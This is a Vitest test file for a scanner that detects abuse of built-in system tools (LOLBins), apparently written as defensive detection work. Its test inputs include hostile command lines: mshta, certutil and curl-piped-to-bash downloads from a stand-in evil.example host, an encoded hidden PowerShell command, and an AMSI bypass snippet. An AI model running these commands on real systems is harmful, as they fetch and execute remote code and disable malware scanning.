import { describe, it, expect, beforeEach } from 'vitest'
import path from 'path'
import {
  loadLolbinCatalog,
  matchLolbinCommand,
  matchLolbinContent,
  hitsToCloudFindings,
  hitsToMalwareThreats,
  resetLolbinCatalogCache,
  getLolbinCatalogInfo,
} from './lolbin-scanner'

const CATALOG = path.resolve(__dirname, '../../../rules/security/lolbins.json')

describe('lolbin-scanner', () => {
  beforeEach(() => resetLolbinCatalogCache())

  it('loads the shipped catalog', () => {
    const info = getLolbinCatalogInfo(CATALOG)
    expect(info.ruleCount).toBeGreaterThan(15)
    expect(info.version).toMatch(/^\d+\./)
    const loaded = loadLolbinCatalog(CATALOG)
    expect(loaded.rules.every((r) => r.id && r.detectionName)).toBe(true)
  })

  it('detects mshta remote script on win32 cmdline', () => {
    const hits = matchLolbinCommand(
      'C:\\Windows\\System32\\mshta.exe https://evil.example/payload.hta',
      { platform: 'win32', catalogPath: CATALOG },
    )
    expect(hits.some((h) => h.ruleId === 'lolbas.mshta.remote')).toBe(true)
  })

  it('detects PowerShell encoded command', () => {
    const hits = matchLolbinCommand(
      'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
      { platform: 'win32', catalogPath: CATALOG },
    )
    expect(hits.some((h) => h.ruleId === 'lolbas.powershell.encoded')).toBe(true)
  })

  it('detects certutil decode', () => {
    const hits = matchLolbinCommand(
      'certutil.exe -urlcache -split -f http://x/a.exe %TEMP%\\a.exe',
      { platform: 'win32', catalogPath: CATALOG },
    )
    expect(hits.some((h) => h.ruleId === 'lolbas.certutil.decode')).toBe(true)
  })

  it('skips win32 rules on linux', () => {
    const hits = matchLolbinCommand(
      'mshta.exe https://evil.example/x.hta',
      { platform: 'linux', catalogPath: CATALOG },
    )
    expect(hits.some((h) => h.ruleId === 'lolbas.mshta.remote')).toBe(false)
  })

  it('detects curl|bash on linux content', () => {
    const hits = matchLolbinContent(
      'curl -fsSL https://evil.example/i.sh | bash',
      'script',
      { platform: 'linux', catalogPath: CATALOG },
    )
    expect(hits.some((h) => h.ruleId === 'linux.curl_bash_pipe')).toBe(true)
  })

  it('detects AMSI bypass technique in script content', () => {
    const hits = matchLolbinContent(
      '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")',
      'script',
      { platform: 'win32', catalogPath: CATALOG },
    )
    expect(hits.some((h) => h.ruleId === 'technique.amsi_bypass')).toBe(true)
  })

  it('does not flag benign powershell', () => {
    const hits = matchLolbinCommand(
      'powershell.exe -NoProfile -File C:\\Scripts\\backup.ps1',
      { platform: 'win32', catalogPath: CATALOG },
    )
    expect(hits.some((h) => h.ruleId === 'lolbas.powershell.encoded')).toBe(false)
    expect(hits.some((h) => h.ruleId === 'lolbas.powershell.download_cradle')).toBe(false)
  })

  it('maps hits to cloud findings and malware threats', () => {
    const hits = matchLolbinCommand(
      'mshta.exe vbscript:Execute("evil")',
      { platform: 'win32', catalogPath: CATALOG },
    )
    const findings = hitsToCloudFindings(hits)
    expect(findings[0].category).toBe('lolbin')
    const threats = hitsToMalwareThreats(hits, 'cmdline', 'mshta.exe')
    expect(threats[0].source).toBe('heuristic')
    expect(threats[0].detectionName).toContain('LOLBin')
  })
})
